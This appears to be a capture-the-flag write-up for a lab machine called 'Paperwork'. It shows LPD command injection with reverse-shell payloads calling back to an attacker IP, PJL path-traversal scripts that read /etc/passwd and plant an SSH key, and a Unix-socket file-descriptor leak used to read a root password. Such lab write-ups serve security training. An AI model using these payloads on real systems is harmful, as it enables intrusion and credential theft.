# Paperwork

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.46.140

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/paperwork_tcp.htb $ip
# 22/tcp   open  ssh
# 80/tcp   open  http
# 1515/tcp open  ifor-protocol



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/paperwork_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/paperwork_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>&#x20;

**Let's modfiy the hosts  file then we discover the web app**

{% code overflow="wrap" %}
```bash
echo "$ip paperwork.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
unzip -l paperwork-archive-v1.02.zip
# 2820  2026-03-12 09:09   server.py
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>&#x20;

**Debbuging this file it contain i think a command injection in the handle\_print\_job method**

{% code overflow="wrap" %}
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
{% endcode %}

**The `job_name` is extracted from lines starting with 'J' in the print job content, and it's directly inserted into a shell command without sanitization!**

{% code overflow="wrap" %}
```bash
python3 exploit.py
============================================================
Attempt 1: Reverse Shell
============================================================
[*] Connected to 10.129.45.122:1515
[*] Job Request Ack: b'\x00'
[*] Using payload: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f; echo '
[*] Control Header Ack: b'\x00'
[*] Sent 90 bytes of content
[*] Content Ack 1: b'\x00'
[-] Timeout waiting for acks. Server might have crashed or payload failed.
[*] Waiting 3 seconds for shell...
[*] Connection closed
```
{% endcode %}

{% hint style="info" %}
**Remote job submission must conform to business requirements for archival indexing. Submissions without a valid identifier will fail to process through the legacy intake processor.**
{% endhint %}

**this is mentionned in the index page this why i dont receive replies however the exploit it work or not**

<mark style="color:blue;">**Step 4**</mark>

**Now we start scanning for hidden endpoints and also vhosts**&#x20;

**i cant found nothing so returning to the exploit i tried more and it work**&#x20;

{% code overflow="wrap" %}
```python
#!/usr/bin/env python3
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.129.46.140"
PORT = 1515

# Based on the banner: "Archive_Printer is ready and printing."
QUEUE_NAMES = ["Archive_Printer", "Archive", "Printer", "lp", "default","archive_intake"]

def try_queue(queue_name, use_null=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((TARGET, PORT))
        payload = b"\x02" + queue_name.encode()
        if use_null:
            payload += b"\x00"
        s.send(payload)
        ack = s.recv(1)
        if ack == b"\x00":
            return s
        s.close()
    except:
        s.close()
    return None

def send_control_file(s, job_name):
    # Construct the LPD control file
    # H = host, P = user, J = job name (where our injection happens)
    control_content = f"Hlocalhost\nProot\nJ{job_name}\n".encode()
    size = len(control_content)

    # Subcommand 2: Receive control file
    # Format: \x02 + size + " " + filename + \x00
    header = f"\x02{size} cfA001localhost\x00".encode()
    s.send(header)

    # Server expects \x00 ack for header
    if s.recv(1) != b"\x00":
        print("[-] No ack for control header")
        return False

    # Send the actual control file content
    s.send(control_content)

    # Server expects \x00 ack for content
    if s.recv(1) != b"\x00":
        print("[-] No ack for control content")
        return False

    return True

if __name__ == "__main__":
    print(f"[*] Target: {TARGET}:{PORT}")

    for q in QUEUE_NAMES:
        # Try without null byte first, then with null byte
        for use_null in [False, True]:
            print(f"[*] Trying queue: '{q}' (null_byte={use_null})")
            s = try_queue(q, use_null)

            if s:
                print(f"[+] SUCCESS! Queue accepted: '{q}'")

                # Command Injection Payload
                # The server runs: echo 'Archive: {job_name}' >> /tmp/archive.log
                # We break out of the single quotes to execute our command.
                payload_job = "' ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.6\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);   os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);' ; echo '"

                print(f"[*] Sending control file with payload: {payload_job}")
                if send_control_file(s, payload_job):
                    print("[+] Exploit sent successfully!")
                    print("[*] Verify command execution by checking if /tmp/pwned exists on the target.")
                s.close()
                sys.exit(0)
            else:
                print(f"[-] Rejected")

    print("[-] Could not find a valid queue name.")
```
{% endcode %}

{% code overflow="wrap" %}
```bash
listener 9001
connect to [10.10.14.6] from (UNKNOWN) [10.129.46.140] 36234

python3 -c 'import pty; pty.spawn("/bin/bash")'

# then CTRL+Z
stty raw -echo; fg
# hit ENTER twice
export TERM=xterm
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Let's now try to elevate our privs**

{% code overflow="wrap" %}
```bash
ss -tunlp
# tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*
# tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
```
{% endcode %}

#### <mark style="color:red;">Port 9100 (JetDirect / PJL)</mark>

**We forward this port through ligolo**

{% code overflow="wrap" %}
```bash
nc -vn 240.0.0.1 9100
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```
{% endcode %}

**So we donwload this file**&#x20;

{% code overflow="wrap" %}
```python
import socket

TARGET = "240.0.0.1" # Your target IP
PORT = 9100

# Files we found in the PJL filesystem
files_to_download = [
    ("0:/logs/commands.log", 985),
    ("0:/jetdirect.py", 5119)
]

for path, size in files_to_download:
    print(f"[*] Downloading {path} ({size} bytes)...")
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((TARGET, PORT))
        # Construct the FSUPLOAD command with the exact size
        cmd = f'\x1b%-12345X@PJL FSUPLOAD NAME="{path}" SIZE={size}\n\x1b%-12345X'.encode()
        s.send(cmd)

        data = b""
        # Read exactly the number of bytes we expect
        while len(data) < size:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        s.close()

        # Save the file
        filename = path.split("/")[-1]
        with open(filename, "wb") as f:
            f.write(data[:size]) # Ensure we only write the exact file size
        print(f"[+] Successfully saved to {filename}")

    except Exception as e:
        print(f"[-] Error downloading {path}: {e}")
```
{% endcode %}

#### The Vulnerability: Path Traversal

the script translates PJL paths to local filesystem paths:

{% code overflow="wrap" %}
```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```
{% endcode %}

**Because it uses `os.path.normpath` on user-supplied input without checking if the final path stays inside `self._root`, we can use `../` to escape the printer's root directory and access the entire filesystem!**

{% code overflow="wrap" %}
```python
def write(self, path, data):
    target = self._translate(path)
    try:
        os.makedirs(os.path.dirname(target), exist_ok=True) # Creates directories if they don't exist!
        with open(target, "wb") as f: f.write(data)
        return "OK"
```
{% endcode %}

**It will automatically create directories (like `.ssh`) if they don't exist, and write the file!**\
\
**we start by reading files using path traversal**

#### `read_pjl.py`

{% code overflow="wrap" %}
```python
import socket
import sys
import re

def read_file(target_ip, port, file_path):
    s = socket.socket()
    s.settimeout(5)
    s.connect((target_ip, port))

    # Use a massive amount of ../ to ensure we reach the root directory
    # os.path.normpath will safely ignore any extra ../ once it hits /
    pjl_path = f'0:/../../../../../../../../{file_path.lstrip("/")}'

    cmd = f'\x1b%-12345X@PJL FSUPLOAD NAME="{pjl_path}" SIZE=100000\n\x1b%-12345X'.encode()
    s.send(cmd)

    # 1. Read the header line by line until we hit a newline
    header = b""
    while True:
        char = s.recv(1)
        if not char or char == b"\n":
            break
        header += char

    header_str = header.decode('utf-8', errors='ignore')
    print(f"[*] Server Header: {header_str.strip()}")

    if "FILEERROR" in header_str:
        return "[-] File not found or access denied."

    # 2. Extract the exact file size from the header
    match = re.search(r'SIZE=(\d+)', header_str)
    if not match:
        return "[-] Could not parse SIZE from header."

    size = int(match.group(1))
    print(f"[*] Expected file size: {size} bytes")

    # 3. Read EXACTLY that many bytes
    data = b""
    while len(data) < size:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk

    s.close()
    return data.decode(errors='ignore')

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 read_pjl.py <target_file_path>")
        sys.exit(1)

    print(read_file("240.0.0.1", 9100, sys.argv[1]))
```
{% endcode %}

{% code overflow="wrap" %}
```bash
python3 read_pjl.py /etc/passwd
[*] Server Header: @PJL FSUPLOAD NAME="0:/../../../../../../../../etc/passwd" SIZE=1672
[*] Expected file size: 1672 bytes
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```
{% endcode %}

**No we persist using ssh\_key but first we need t enumarate**&#x20;

{% code overflow="wrap" %}
```bash
 python3 read_pjl.py /home/archivist/.ssh/authorized_keys
 # 2345Xssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINhD9NaIdHvhW1EdgHP0Q3saaHcXeQlAinelJW0nTKmb r

```
{% endcode %}

#### `write_pjl.py`&#x20;

{% code overflow="wrap" %}
```python
cat write_pjl.py
import socket
import sys

def write_file(target_ip, port, file_path, local_file_path):
    s = socket.socket()
    s.settimeout(5)
    s.connect((target_ip, port))

    pjl_path = f'0:/../../../../../../../../{file_path.lstrip("/")}'

    with open(local_file_path, "rb") as f:
        data = f.read()

    size = len(data)

    cmd = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="{pjl_path}" SIZE={size}\n'.encode()
    s.send(cmd)
    s.send(data)

    # Read the response until we get OK or FILEERROR
    res = b""
    while True:
        chunk = s.recv(1)
        if not chunk: break
        res += chunk
        # The server replies with "OK\r\n" or "FILEERROR=1\r\n"
        if b"OK" in res or b"FILEERROR" in res:
            break

    s.close()
    return res.decode(errors='ignore').strip()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 write_pjl.py <target_file_path> <local_file>")
        sys.exit(1)

    print(write_file("240.0.0.1", 9100, sys.argv[1], sys.argv[2]))
```
{% endcode %}

{% code overflow="wrap" %}
```bash
ssh-keygen -f archivist_key -N ""
python3 write_pjl.py /home/archivist/.ssh/authorized_keys archivist_key.pub
python3 read_pjl.py /home/archivist/.ssh/authorized_keys
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINhD9NaIdHvhW1EdgHP0Q3saaHcXeQlAinelJW0nTKmb root@soso
```
{% endcode %}

<mark style="color:blue;">**Step 6**</mark>

**now we need to elevate to root**

{% code overflow="wrap" %}
```bash
ps aux | grep root
# root        1487  0.0  0.4  28432 17900 ?        Ss   12:48   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon

cat /usr/bin/paperwork-daemon
```
{% endcode %}

**This one looks interestings, let's check PID 1487. It's a custom deamon running as root**

**Unix Socket File Descriptor Leak** vulnerability

{% code overflow="wrap" %}
```bash
def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])  # ← admin_fd is leaked!
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```
{% endcode %}

When the daemon detects "malice" (FSQUERY, FSUPLOAD, or FSDOWNLOAD in the log), it **sends file descriptors to the client via Unix socket ancillary data** (`SCM_RIGHTS`).

The `admin_fd` points to `/etc/paperwork/admin_pins.conf`, which is opened by the root process at startup. By connecting to the socket and triggering the lockdown, we can **receive this file descriptor and read the admin password as `archivist`**, bypassing filesystem permissions!

{% code overflow="wrap" %}
```python
#!/usr/bin/python3
import socket
import struct

SOCKET_PATH = "/run/paperwork/mgmt.sock"

def recv_fds(sock, msglen, maxfds=2):
    """Receive file descriptors via Unix socket ancillary data"""
    fds = []
    # Calculate the size of the ancillary data buffer
    # Each FD is 4 bytes (int), plus some overhead for the cmsghdr structure
    ancillary_size = socket.CMSG_LEN(struct.calcsize("i")) * maxfds

    # Receive the message and ancillary data
    msg, ancdata, _, _ = sock.recvmsg(msglen, socket.MSG_WAITALL)

    # Parse the ancillary data to extract file descriptors
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
            # Unpack the file descriptors
            fd_count = len(cmsg_data) // struct.calcsize("i")
            fds.extend(struct.unpack("i" * fd_count, cmsg_data[:fd_count * struct.calcsize("i")]))

    return msg, fds

def main():
    # Connect to the Unix socket
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(SOCKET_PATH)

    print("[*] Connected to paperwork-daemon socket")
    print("[*] Waiting for file descriptors...")

    # Receive the message and file descriptors
    msg, fds = recv_fds(sock, 1024, maxfds=2)

    print(f"[+] Received message: {msg.decode(errors='ignore')}")
    print(f"[+] Received {len(fds)} file descriptors: {fds}")

    # Read from each file descriptor
    for i, fd in enumerate(fds):
        print(f"\n[*] Reading from FD {fd}...")
        try:
            # Seek to beginning (just in case)
            os.lseek(fd, 0, os.SEEK_SET)
            content = os.read(fd, 4096)
            print(f"[+] Content of FD {i} (fd={fd}):")
            print(content.decode(errors='ignore'))
        except Exception as e:
            print(f"[-] Error reading FD {fd}: {e}")
        finally:
            os.close(fd)

    sock.close()

if __name__ == "__main__":
    import os
    main()

```
{% endcode %}

{% code overflow="wrap" %}
```bash
# on target
echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log
python3 exploit_fd_leak.py
# ADMIN_PASSWORD=ApparelMortuaryCedar22

su root
root@paperwork:/home/archivist# id
uid=0(root) gid=0(root) groups=0(root)

```
{% endcode %}
